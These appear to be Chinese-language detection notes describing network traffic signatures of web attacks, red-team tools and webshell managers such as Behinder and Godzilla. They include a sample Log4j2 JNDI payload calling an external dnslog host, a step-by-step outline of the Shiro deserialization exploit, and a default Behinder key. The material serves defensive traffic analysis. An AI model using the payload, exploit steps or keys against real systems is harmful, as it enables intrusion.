# 流量特征
## 常见攻击
### sql注入流量特征
1、特殊关键字：
SQL关键字，如SELECT, WHERE, ORDER BY, UNION, UPDATE,DELETE,
INSERT等，这些通常用于构建或修改查询。
》系统函数，如USER(), @@VERSION（在MySQL中），这些可能用于获取数据
库版本或当前用户等敏感信息
》特定数据库的函数或特性，如information_schema（用于获取数据库结构信
息）、extractvalue（XML相关函数，有时用于绕过某些过滤）、floor（在盲注
中用于产生条件差异）等。
2、编码和转义：
特殊字符（如单引号'、双引号"、等号=等）进行编码，常见的编码包括URL编
码（如%27代表单引号）、十六进制编码等。使用注释符号，如--或/* \*/，来注
释掉SQL语句的某部分，以改变查询的行为。
3、多个或错误的SQL语句：攻击者可能尝试在一个请求中插入多个SQL语句，
或者插入格式错误的SQL语句，以触发数据库的错误响应或执行未经授权的操作
### XSS流量特征
1、Payload中包含HTML或JavaScript标签
2、如果在返回的响应包中发现了与请求包中相同的攻击语句，并且这些语句仍
然被包裹在HTML标签内
3、请求中携带XSS脚本，返回值包含脚本并可嵌入HTML页面
4、返回包中的攻击语句未被转义
### RCE流量特征
1、请求体或URL中，可能会出现危险的函数，如PHP中的system()、exec()、
shell_exec()、passthru函数，popen函数，eval函数和assert()、JSP和ASP代码中
也可能出现类似的运行时命令执行代码
2、流量中可能包含特殊字符，如|，||，&，&&，反引号 ，>，>>，<，<<
等，这些字符在命令行中常常被用于命令连接、条件判断或重定向等功能
3、流量中可能出现系统命令、系统目录或敏感文件的引用
系统命令：如ls、cat、rm等，用于查看、读取或删除文件。
系统目录：如/etc、/var/log等，存储了系统的配置文件和日志文件。
敏感文件：如/etc/passwd、/etc/shadow等，包含用户账户和密码信息。
### SSRF流量特征
1、URL参数异常：URL参数是否修改为指向内网地址或其他不应该被访问的地
址，(share、wap、url、link、src、source、target、domain等）这些参数后面
的值是不是内网的IP地址或者是127.0.0.1或者是一些协议的一些关键字眼
2、伪协议使用：查看URL上是否有file/gopher/ftp/dict协议等伪协议来访问目标
资源
3、参数值后面存在特殊字符：攻击者可能会使用特殊字符来绕过安全过滤机
制，例如点号.、冒号:、空格等。也可能使用各种编码（如URL编码、Base64编
码等）或进制转换来隐藏或混淆IP地址或域名，特殊的域名如xip.io可能被用于
动态生成IP地址，从而绕过某些安全限制
## 红队工具
### CobaltStrike流量特征
1、HTTP请求特征：在CobaltStrike的http-beacon通信中，默认使用GET方法向
特定的URL地址（如/dpixel、/utm.gif、/pixel.gif、/load等）发起请求。请求
头中存在cookie字段，并且该字段的值是base64编码后的非对称加密算法加密
数据。
2、HTTPS证书特征：在https-beacon通信中，CobaltStrike默认使用空证书建立
加密通道
3、DNS请求异常：DNS隧道技术来传输数据，在DNS请求中，域名可能以特定
前缀开头（如“cdn.”、“www6.”、“api.”等），查询结果可能包含非常规的IP地
址，这些地址用于指令传输或心跳检测。
4、心跳包特征：CobaltStrike通过发送心跳包来保持与被控端的通信。这些心跳
包可能是定期发送的，其默认间隔通常为60秒，用于确认被控端的在线状态。
5、端口特征：CobaltStrike默认使用50050端口进行通信。然而，这个端口是可
以修改的，只需要编辑teamserver文件并修改server_port即可。
6、源码特征：在流量中，通过http协议的url路径，经过checksum8解密算法计
算后，32位的后门得到的结果是92，而64位的后门得到的结果是93
### Metasploit 流量特征
1、端口号：msf数据库默认使用的postgresql的端口可能是5432，msf默认使用
4444端口作为反向连接端口
2、数据内容：msf数据包通常包含特定字符串"meterpreter"、"revshell"等
3、特殊协议：MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、
Reverse TCP 等
### sqlmap流量特征
User-Agent关键字特征：Sqlmap工具在发起请求时，其默认的UserAgent中通常包含“sqlmap”关键字，如“sqlmap/1.5.8#stable
攻击流程的顺序和规律：Sqlmap的攻击流程通常遵循一定的顺序和规律。例如在利用--os-shell攻击时，它会首先测试链接是否能够访问，接着判断操作系统版本，尝试爆绝对路径，指定上传路径，写入一个php文件，找到上传文件的访问路径，上另一个php文件并执行命令等Payload测试语句的模板特征：Sqlmap使用的payload测试语句往往具有模板特征。
例如，在盲注入时，它会使用逻辑语句（如and、or）和特定的函数来测试SQL注入的可行性。这些语句在流量中会以特定的模式出现，如尝试让SQL语句报错来发现SQL漏洞，或者使用特定的函数（如@@version_compile_os）来判断操作系统等。
## 框架以及中间件特征
### Shiro反序列化漏洞原理
Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后
会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先
base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞那么，Payload
产生的过程：命令=>序列化=>AES加密=>base64编码=>RememberMe Cookie
值在整个漏洞利用过程中，比较重要的是AES加密的密钥如果没有修改默认的密
钥那么就很容易就知道密钥了
利用过程
构造Payload：攻击者首先需要将恶意代码序列化为字节流。
AES加密：然后，使用Shiro默认的AES密钥对这个字节流进行加密。
Base64编码：接着，对加密后的字节流进行Base64编码，使其可以作为cookie
值的一部分。
设置Cookie：最后，将这个Base64编码后的值设置为rememberMe cookie的
值，并将其发送给目标服务器。当目标服务器接收到这个恶意的rememberMe
cookie时，它会尝试对其进行解密和反序列化，从而触发漏洞，执行攻击者指定
的恶意代码。
### Shiro550与Shiro721的区别
Shiro550：这个漏洞利用了已知密钥碰撞,不需要真实的rememberMe cookie，
只需要有足够的密钥库来尝试碰撞。
Shiro721：在这个版本中，AES加密的密钥不再是硬编码的，而是系统随机生成
的。这使得攻击者很难直接猜到正确的密钥。然而仍然可以利用登录后的有效
rememberMe cookie作为Padding Oracle Attack的前缀，通过精心构造的cookie
值来实现反序列化漏洞攻击
Shiro反序列化流量特征
未登录状态：请求包的cookie中没有rememberMe字段，返回包set-Cookie里也
没有deleteMe字段。
登录失败：无论是否勾选RememberMe，返回包都会有
rememberMe=deleteMe字段。
不勾选RememberMe登录成功：返回包set-Cookie会有rememberMe=deleteMe
字段，但后续请求中Cookie不会有rememberMe字段。
勾选RememberMe登录成功：返回包set-Cookie会有rememberMe=deleteMe字
段和rememberMe字段，后续请求中Cookie也会有rememberMe字段。
Apache Log4j2 远程代码执行漏洞原理
Apache Log4j2 框架中存在一个名为 JNDI Lookup 的功能，它允许通过配置文件
中的 JNDI 名称引用外部资源。lookup功能的实现类 JndiLookup 的设计缺陷导
致，启动一个JNDI服务，通过rmi注册一个恶意实例，使用lookup远程加载导致
RCE${jndi:ldap://log4j.voxxaq.dnslog.cn}，构造一个特殊的日志消息，其中包含
恶意的 JNDI 名称，并通过网络发送给受影响的应用程序。当应用程序使用
### Log4j2 
框架解析日志消息时，它会尝试查找和引用该 JNDI 名称。如果恶意的
JNDI 名称指向一个恶意的远程资源，例如恶意的 LDAP 服务器或 RMI 服务，攻
击者可以控制该远程资源的内容和行为。攻击者可以在恶意的远程资源中注入恶
意代码，并在目标系统上执行任意命令或获取敏感信息
Log4j2 远程代码执行流量特征
1、dnslog类：查看是否存在源ip与dnslog的外联日志记录
2、数据包里有{jndi:ladp//}字段
3、命令执行攻击
有回显：响应体中存在命令执行结果
无回显 ：存在源ip与ldap服务ip的外联日志记录
fastjson反序列化漏洞原理
在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没
有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，
而这个类有一个字段就是bytecodes，有部分函数会根据这个bytecodes生成java
实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造
函数
### fastjson反序列化流量特征
1、Payload中的特定关键词: Fastjson反序列化漏洞通常会利用恶意构造的JSON
Payload，其中可能包含一些特定的关键词或字符串，例如""@type""，@type字
段指定要加载的类，常见的带有ladp、rmi协议地址
2、HTTP请求方法: 恶意请求通常使用POST方法，因为Fastjson反序列化漏洞通
常利用HTTP POST请求发送恶意JSON数据
3、HTTP请求头部: 检查HTTP请求头部，特别是Content-Type字段，通常
Fastjson漏洞攻击会将Content-Type设置为"application/json"。
struts2命令执行漏洞原理
Struts2框架的动态性在于其使用的OGNL表达式可以在运行时获取变量的值并执
行函数调用。如果可以将恶意的请求参数传递到OGNL的执行流程中，就会导致
任意代码执行漏洞。Struts2的RCE（远程代码执行）本质都是一样的（除了S2-
052以外），都是Struts2框架执行了恶意用户传入的OGNL表达式，造成远程代
码执行。可以利用这一漏洞执行远程命令，获取系统权限，或者进行其他恶意行
为。
### struts2命令执行流量特征
1. 在请求头中存在OGNL表达式，一般在url中会出现的攻击特征主要是:.action?
method | ?redirect:$ 在conten-type中出现的攻击特征主要有:%{#context 、在报
文体中出现的攻击特征主要有:#\_memberAccess 等
2. 判断请求中是否包含特定的 Struts2 关键字，
如"method:"、"redirect:"memberAcecess,getRuntime,println,双引号，单引号，
等号，括号之类的符号。等，这些关键字可能是用于执行命令的操作；
3. 检查请求中是否包含"Content-Type"头字段，并且值为"application/x-www-
form-urlencoded"，这是 Struts2 框架默认的 Content-Type 值，用于处理 POST
请求；
4. 检查请求参数中是否包含OGNL表达式，如"${}"、"%{}"等字符；
5. 检查请求是否包含一个名为"class"的参数，值为"java.lang.Runtime"，这个参
数可以用于执行系统命令
## Webshell管理工具流量特证
### 菜刀流量特征：
1、默认的webshell中链接密码都是caidao、webshell 为一句话木马
2、请求包中的User-Agent（UA）头可能为百度或火狐等爬虫标识
3、请求体中存在 eval，base64等特征字符，eval函数用于执行传递的攻击
payload，菜刀默认是使用Base64编码(base64_decode($\_POST[XXX]))将攻击
payload进行Base64解码
4、响应为明文，格式为 X@Y +内容 + X@Y、php的webshel中流量参数z0、
z1、z2
5、连接建立后，会发送特定的验证码，如“knife”或“dadan”等进行验证
### 蚁剑流量特征：
1、默认的User-Agent请求头：蚁剑的默认User-Agent请求头通常为“antsword
xxx”，但这个值是可以修改的。
2、请求体特征：PHP类WebShell流量请求体通常都以
@ini_set("display_errors","0");@set_time_limit(0)开头
3、Webshell静态与动态特征：
在使用蚁剑上传和管理Webshell时，不同的脚本语言（如PHP、ASP、JSP）会
展现出不同的静态特征。例如，PHP中可能使用assert、eval执行代码，而ASP则
主要依赖eval执行。
动态特征方面，通过上传Webshell并抓包分析，可以发现每个请求体都包含特
定的代码片段（如上述的@ini_set等），并且响应体通常会进行base64编码混
淆，解码后，可以观察到攻击行为的payload。
4、加密与混淆：蚁剑使用了AES加密，同时采用二进制协议通信，在混淆加密
后，参数名大多以“\_0x.....=”的形式出现，其中“\_0x”后面的部分通常是加密后的
数据。
5、URL加密：蚁剑的正文内容通常使用URL加密，解密后的流量中，上述的
@ini_set("display_errors","0")等特征会更为明显
### 冰蝎2.0流量特征：
1、请求头部：User-Agent字段可能表现出多样性
2、请求体：通常使用AES加密，并通过base64编码进行传输
3、Cookie字段：建立连接后，所有请求的Cookie格式通常为Cookie:
PHPSESSID=; path=/;
4、返回包特征：在建立连接的初始阶段，返回包中通常包含16位的密钥，用于
后续的通信加密。
5、数据包结构：具有特定的结构特征，如通常以0x01开头，以0x00结尾，中间
包含蝎子协议特征数据
### 冰蝎3.0流量特征：
1、加密与编码：
冰蝎3.0使用AES加密和base64编码进行通信
冰蝎3.0使用固定的连接密钥。AES加密的密钥直接固定为webshell连接密码的
MD5哈希值的前16位。默认情况下，连接密码是“rebeyond”，因此AES加密的密
钥就是“e45e329feb5d925b”。
2、User-Agent多样性：冰蝎3.0在请求时内置了多个User-Agent头，并在每次请
求时随机选择其中一个
3、Content-Type字段：当冰蝎3.0连接jsp的webshell时，请求数据包中的
Content-Type字段常见为“application/octet-stream”。
4、请求头字段：冰蝎3.0的请求包中还可能包含其他特定的请求头字段，如
“Pragma: no-cache”和“Cache-Control: no-cache”，用于控制缓存行为。
5、content-length字段：通常为5740或5720，但这一数值可能会根据Java版本
的不同而有所变化。同时，请求头中仍然包含随机选择的User-Agent，以增加
流量的隐蔽性。
### 冰蝎3.11流量特征
1、头部信息特征：冰蝎3.11的header头顺序是颠倒的，这种非标准的请求头顺序有助于识别其流量。
在通信过程中，冰蝎3.11可能会频繁使用特定的User-Agent，如“WOW64”等
2、数据编码与加密：发送的数据包通常是base64编码的，而返回的数据包则是
以字节数组的形式呈现，这可能导致接收到的数据出现乱码现象。
冰蝎3.11对交互流量进行AES对称加密，这种加密方式使得流量内容难以被直接
解析，增加了其隐蔽性。
3、密码验证与连接建立：如果冰蝎3.11的密码不正确，会出现两个连接尝试，
一个是POST请求，另一个是GET请求，其content-type为application/octet-
stream。
在请求包中，content-length的值可能为5740或5720（可能会根据Java版本而改
变），这也是一个识别冰蝎3.11流量的线索。
4、缓存控制：在每一个请求头中，都可能存在Pragma: no-cache和Cache-
Control: no-cache这样的缓存控制字段，这是冰蝎3.11为了避免被缓存而采取的
措施。
5、请求路径：冰蝎3.11可能会频繁访问默认的路径，如“/con”，这种特定的访
问模式也是识别其流量的一个重要依据。
冰蝎4.1流量特征:
提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流
量加解密协议的去中心化。v4.0版本不再有连接密码的概念，自定义传输协议的
算法就是连接密码。
Accept字段（弱特征），通常是Accept: application/json, text/javascript, /;
q=0.01 意思是浏览器可接受任何文件，但最倾向application/json 和
text/javascript。
Content-Type字段（弱特征），通常是Content-type: Application/x-www-form-
urlencoded
与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时
会随机选择其中的一个。
连接的端口有一定的特征，冰蝎与webshell建立连接的同时，java也与目的主机
建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接
一次，每建立一次新的连接，端口就依次增加。
使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头
里会带有 Connection：Keep-Alive
有固定的请求头和响应头，请求字节头：
dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：
TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd
默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同。
### 哥斯拉流量特征：
1、Webshell特征：使用eval和base64编码。eval函数用于执行传递的攻击
payload，而base64编码则用于混淆和隐藏数据。
2、请求包特征：
请求包通常以“pass=”为起始，这是一个用于传递认证信息的常见参数
哥斯拉的请求包通常较长，而响应包长度可能为0
在一个TCP包中可能包含三个HTTP请求
User-Agent字段在默认情况下类似于“Java/1.8.0_121”，具体版本取决于JDK环境
版本
Cookie字段中存在一个关键的特征，即最后一个Cookie值的末尾有一个不必要
的分号，在标准的HTTP请求中，最后一个Cookie的值后面不应该出现分号
3、响应包特征：哥斯拉的响应包具有特定的结构特征，即整个响应包的结构体
征为：md5前十六位+base64+md5后十六位